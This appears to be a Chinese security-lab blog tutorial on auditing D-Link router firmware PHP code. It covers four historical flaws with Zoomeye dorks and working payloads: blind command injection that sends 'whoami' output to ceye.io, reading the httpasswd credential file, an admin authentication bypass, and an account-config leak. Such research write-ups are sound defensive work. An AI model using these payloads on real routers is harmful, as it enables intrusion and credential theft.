作者：Sebao@知道创宇404实验室

#### 前言

前几天去上海参加了geekpwn，看着大神们一个个破解成功各种硬件，我只能在下面喊
6666，特别羡慕那些大神们。所以回来就决定好好研究一下路由器，争取跟上大神们的步伐。看网上公开的D-Link系列的漏洞也不少，那就从D-Link路由器漏洞开始学习。

#### 准备工作

既然要挖路由器漏洞，首先要搞到路由器的固件。 D-Link路由器固件下载地址：

<ftp://ftp2.dlink.com/PRODUCTS/>

下载完固件发现是个压缩包，解压之后里面还是有一个bin文件。听说用binwalk就可以解压。kali-linux自带binwalk，但是缺少一些依赖，所以还是编译安装了一下。

    
    
    $ sudo apt-get update  
    $ sudo apt-get install build-essential autoconf git
    
    # https://github.com/devttys0/binwalk/blob/master/INSTALL.md  
    $ git clone https://github.com/devttys0/binwalk.git  
    $ cd binwalk
    
    # python2.7安装  
    $ sudo python setup.py install
    
    # python2.7手动安装依赖库  
    $ sudo apt-get install python-lzma
    
    $ sudo apt-get install python-crypto
    
    $ sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip  
    $ sudo pip install pyqtgraph
    
    $ sudo apt-get install python-pip  
    $ sudo pip install capstone
    
    # Install standard extraction utilities（必选）  
    $ sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools
    
    # Install sasquatch to extract non-standard SquashFS images（必选）  
    $ sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev  
    $ git clone https://github.com/devttys0/sasquatch  
    $ (cd sasquatch && ./build.sh)
    
    # Install jefferson to extract JFFS2 file systems（可选）  
    $ sudo pip install cstruct  
    $ git clone https://github.com/sviehb/jefferson  
    $ (cd jefferson && sudo python setup.py install)
    
    # Install ubi_reader to extract UBIFS file systems（可选）  
    $ sudo apt-get install liblzo2-dev python-lzo  
    $ git clone https://github.com/jrspruitt/ubi_reader  
    $ (cd ubi_reader && sudo python setup.py install)
    
    # Install yaffshiv to extract YAFFS file systems（可选）  
    $ git clone https://github.com/devttys0/yaffshiv  
    $ (cd yaffshiv && sudo python setup.py install)
    
    # Install unstuff (closed source) to extract StuffIt archive files（可选）  
    $ wget -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz | tar -zxv  
    $ sudo cp bin/unstuff /usr/local/bin/

按照上面的命令就可以完整的安装binwalk了，这样就可以解开市面上的大部分固件包。 然后用 `binwalk -Me 固件包名称`
解固件，然后我们会得到以下划线开头的名称的文件夹，文件夹里`squashfs-root`文件夹，就是路由器的完整固件包。

#### 漏洞挖掘

此文章针对历史路由器的web漏洞进行分析，路由器的web文件夹 一般就在`suashfs-root/www`或者 `suashfs-root/htdocs`文件夹里。路由器固件所使用的语言一般为 asp,php,cgi,lua 等语言。这里主要进行php的代码审计来挖掘漏洞。

##### D-Link DIR-645 & DIR-815 命令执行漏洞

**Zoomeye dork:**
[DIR-815](https://www.zoomeye.org/searchResult?q=%20DIR-815&t=all) or
[DIR-645](https://www.zoomeye.org/searchResult?q=%20DIR-645&t=all)

这里以 D-Link DIR-645固件为例，解开固件进入 `suashfs-root/htdocs` 文件夹。

这个漏洞出现在 `diagnostic.php`文件。直接看代码

    
    
    HTTP/1.1 200 OK
    Content-Type: text/xml
    
    <?
    if ($_POST["act"] == "ping")
    {
        set("/runtime/diagnostic/ping", $_POST["dst"]);
        $result = "OK";
    }
    else if ($_POST["act"] == "pingreport")
    {
        $result = get("x", "/runtime/diagnostic/ping");
    }
    echo '<?xml version="1.0"?>\n';
    ?><diagnostic>
        <report><?=$result?></report>
    </diagnostic>

分析代码可以看到，这里没有进行权限认证，所以可以直接绕过登录。继续往下看，`set("/runtime/diagnostic/ping",
$_POST["dst"]);` 这段代码就是造成漏洞的关键代码。参数`dst` 没有任何过滤直接进入到了
ping的命令执行里，导致任意命令执行漏洞。继续往下看 `$result =
"OK";`无论是否执行成功，这里都会显示OK。所以这是一个盲注的命令执行。以此构造payload

    
    
    url = 'localhost/diagnostic.php'
    data = "act=ping&dst=%26 ping `whoami`.ceye.io%26"

因为是盲注的命令执行，所以这里需要借助一个盲打平台（如：[ceye](http://ceye.io/)），来验证漏洞是否存在。

##### D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 信息泄露漏洞

**Zoomeye
dork:**[DIR-300](https://www.zoomeye.org/searchResult?q=%20DIR-300&t=all) or
[DIR-600](https://www.zoomeye.org/searchResult?q=%20DIR-600&t=all)

这里以 D-Link DIR-300固件为例，解开固件进入 `suashfs-root/www` 文件夹。

漏洞出现在`/model/__show_info.php`文件。

    
    
    <?
    if($REQUIRE_FILE == "var/etc/httpasswd" || $REQUIRE_FILE == "var/etc/hnapasswd")
    {
        echo "<title>404 Not Found</title>\n";
        echo "<h1>404 Not Found</h1>\n";
    }
    else
    {
        if($REQUIRE_FILE!="")
        {
            require($LOCALE_PATH."/".$REQUIRE_FILE);
        }
        else
        {
            echo $m_context;
            echo $m_context2;//jana added
            if($m_context_next!="")
            {
                echo $m_context_next;
            }
            echo "<br><br><br>\n";
            if($USE_BUTTON=="1")
            {echo "<input type=button name='bt' value='".$m_button_dsc."' onclick='click_bt();'>\n"; }
        }
    }
    ?>

这里看到已经禁止了`$REQUIRE_FILE`的参数为`var/etc/httpasswd`和`var/etc/hnapasswd`。这么一看无法获取账号密码。但是我们可以从根路径开始配置`httpasswd`的路径，就可以绕过这个过滤了。

payload：

    
    
    localhost/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd

这里设置`REQUIRE_FILE=/var/etc/httpasswd` 成功绕过上面的 if判断，进行任意文件读取。

##### D-Link DIR-300 & DIR-320 & DIR-615 权限绕过漏洞

**Zoomeye
dork:**[DIR-300](https://www.zoomeye.org/searchResult?q=%20DIR-300&t=all) or
[DIR-615](https://www.zoomeye.org/searchResult?q=%20DIR-615&t=all)

这里以 D-Link DIR-300固件为例，解开固件进入 `suashfs-root/www` 文件夹

默认情况下，Web界面中的所有页面都需要进行身份验证，但是某些页面（如 登录页面） 必须在认证之前访问。
为了让这些页面不进行认证，他们设置了一个PHP变量NO_NEED_AUTH：

    
    
    <?
    $MY_NAME ="login_fail";
    $MY_MSG_FILE=$MY_NAME.".php";
    $NO_NEED_AUTH="1";
    $NO_SESSION_TIMEOUT="1";
    require("/www/model/__html_head.php");
    ?>

此漏洞触发的原因在于 全局文件 `_html_head.php`。

    
    
    <?
    /* vi: set sw=4 ts=4: */
    if ($NO_NEED_AUTH!="1")
    {
     /* for POP up login. */
    // require("/www/auth/__authenticate_p.php");
    // if ($AUTH_RESULT=="401") {exit;}
     /* for WEB based login */
     require("/www/auth/__authenticate_s.php");
     if($AUTH_RESULT=="401") {require("/www/login.php"); exit;}
     if($AUTH_RESULT=="full") {require("/www/session_full.php"); exit;}
     if($AUTH_RESULT=="timeout") {require("/www/session_timeout.php"); exit;}
     $AUTH_GROUP=fread("/var/proc/web/session:".$sid."/user/group");
    }
    require("/www/model/__lang_msg.php");
    ?>

这里我们看到 `$NO_NEED_AUTH!="1"` 如果 `$NO_NEED_AUTH` 不为 1
则进入身份认证。如果我们把`$NO_NEED_AUTH`值 设置为 1 那就绕过了认证进行任意操作。

payload：

`localhost/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0`

这里`AUTH_GROUP=0` 表示admin权限

![](https://images.seebug.org/content/images/2017/10/4e00273b-5edb-43ce-86f5-ff89412ffc55.png-w331s)

##### D-Link DIR-645 信息泄露漏洞

**Zoomeye
dork:**[DIR-645](https://www.zoomeye.org/searchResult?q=%20DIR-645&t=all)

这里以 D-Link DIR-300固件为例，解开固件进入 `suashfs-root/htdocs` 文件夹

D-Link DIR-645 `getcfg.php` 文件由于过滤不严格导致信息泄露漏洞。

    
    
    $SERVICE_COUNT = cut_count($_POST["SERVICES"], ",");
    TRACE_debug("GETCFG: got ".$SERVICE_COUNT." service(s): ".$_POST["SERVICES"]);
    $SERVICE_INDEX = 0;
    while ($SERVICE_INDEX < $SERVICE_COUNT)
    {
        $GETCFG_SVC = cut($_POST["SERVICES"], $SERVICE_INDEX, ",");
        TRACE_debug("GETCFG: serivce[".$SERVICE_INDEX."] = ".$GETCFG_SVC);
        if ($GETCFG_SVC!="")
        {
            $file = "/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php";
            /* GETCFG_SVC will be passed to the child process. */
            if (isfile($file)=="1") dophp("load", $file);
        }
        $SERVICE_INDEX++;
    }

这里我们可以看到 `$GETCFG_SVC` 没有任何过滤直接获取了 POST
传递过来的`SERVICES`的值。如果`$GETCFG_SVC`不为空，则进行文件读取。这里我们就可以读取存储此设备信息的`DEVICE.ACCOUNT.xml.php`文件。

payload：

    
    
    http://localhost/getcfg.php
    post:SERVICES=DEVICE.ACCOUNT

![](https://images.seebug.org/content/images/2017/10/c21419a6-1f43-4a17-b28f-1de633fa7fd4.png-w331s)

#### 总结

可以发现此篇文章所提及的漏洞都是web领域的常见漏洞，如权限绕过，信息泄露，命令执行等漏洞。由于路由器的安全没有得到足够的重视，此文涉及到的漏洞都是因为对参数过滤不严格所导致的。
路由器的漏洞影响还是很广泛的，在此提醒用户，及时更新路由器固件，以此避免各种入侵事件，以及个人信息的泄露。

#### 参考链接

  * <http://www.s3cur1ty.de/m1adv2013-017>
  * <http://seclists.org/bugtraq/2013/Dec/11>
  * <http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf>
  * <https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/429/>

